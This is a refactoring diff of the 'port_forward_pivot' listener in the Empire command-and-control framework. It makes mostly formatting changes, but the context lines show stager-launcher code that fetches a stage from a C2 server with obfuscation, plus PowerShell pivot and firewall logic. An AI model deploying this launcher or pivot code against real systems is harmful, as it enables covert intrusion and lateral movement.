@@ -3,7 +3,6 @@ import copy
 import logging
 import os
 import random
-from builtins import object, str
 from typing import List, Optional, Tuple
 
 from empire.server.common import encryption, helpers, packets, templating
@@ -15,8 +14,8 @@ LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
 
 
-class Listener(object):
-    def __init__(self, mainMenu: MainMenu, params=[]):
+class Listener:
+    def __init__(self, mainMenu: MainMenu):
         self.info = {
             "Name": "port_forward_pivot",
             "Authors": [
@@ -282,7 +281,7 @@ class Listener(object):
 
                 launcherBase += "import urllib.request;\n"
                 launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += "server='%s';t='%s';" % (host, stage0)
+                launcherBase += f"server='{host}';t='{stage0}';"
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -308,7 +307,7 @@ class Listener(object):
                         headerKey = header.split(":")[0]
                         headerValue = header.split(":")[1]
                         # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
-                        launcherBase += 'req.add_header("%s","%s");\n' % (
+                        launcherBase += 'req.add_header("{}","{}");\n'.format(
                             headerKey,
                             headerValue,
                         )
@@ -357,7 +356,7 @@ class Listener(object):
 
                 if obfuscate:
                     launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
-                        launcherBase, obfuscation_command=obfuscation_command
+                        launcherBase
                     )
                     launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
                         launcherBase
@@ -768,7 +767,7 @@ class Listener(object):
                         else{
                             $ConnectAddress = ""
                             $ConnectPort = ""
-        
+
                             $parts = $ConnectHost -split(":")
                             if($parts.Length -eq 2){
                                 # if the form is http[s]://HOST or HOST:PORT
@@ -823,18 +822,18 @@ class Listener(object):
                             )
                             script += " -FirewallName %s" % (session_id)
 
-                            for option, values in self.options.items():
+                            for option in self.options.keys():
                                 if option.lower() == "host":
                                     if self.options[option]["Value"].startswith(
                                         "https://"
                                     ):
-                                        host = "https://%s:%s" % (
+                                        host = "https://{}:{}".format(
                                             tempOptions["internalIP"]["Value"],
                                             tempOptions["ListenPort"]["Value"],
                                         )
                                         self.options[option]["Value"] = host
                                     else:
-                                        host = "http://%s:%s" % (
+                                        host = "http://{}:{}".format(
                                             tempOptions["internalIP"]["Value"],
                                             tempOptions["ListenPort"]["Value"],
                                         )
